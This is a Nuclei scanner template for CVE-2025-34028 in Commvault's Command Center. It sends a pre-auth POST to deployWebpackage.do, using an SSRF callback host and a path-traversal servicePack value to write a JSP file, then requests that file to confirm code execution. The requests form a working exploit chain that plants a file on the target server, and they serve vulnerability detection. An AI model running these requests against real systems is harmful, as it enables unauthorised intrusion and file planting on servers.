id: commvault-cvMessages-detect

info:
  name: Commvault RCE via deployWebpackage.do (CVE-2025-34028)
  author: nickaures
  severity: critical
  description: |
    Commvault Innovation Release 11.38.0â€“11.38.19 is vulnerable to a pre-auth RCE via SSRF + Arbitrary File Write through the deployWebpackage.do endpoint.
  reference:
    - https://watchtowr.com/blog/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/
  tags: rce,commvault,preauth,cve,cve2025,ssrf,fileupload
  classification:
    cve-id: CVE-2025-34028

http:
  - raw:
      - |
        POST /commandcenter/deployWebpackage.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        commcellName={{interactsh-url}}&servicePack=../../Reports/MetricsUpload/nuclei&version=watchtowr

      - |
        GET /reports/MetricsUpload/nuclei/.tmp/dist-cc/dist-cc/watchTowr.jsp HTTP/1.1
        Host: {{Hostname}}

    payloads:
      interactsh-url:
        - "{{interactsh-url}}"

    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "watchTowr was here"
          - "Server Info: Apache Tomcat"
          - "Session ID"
        condition: and
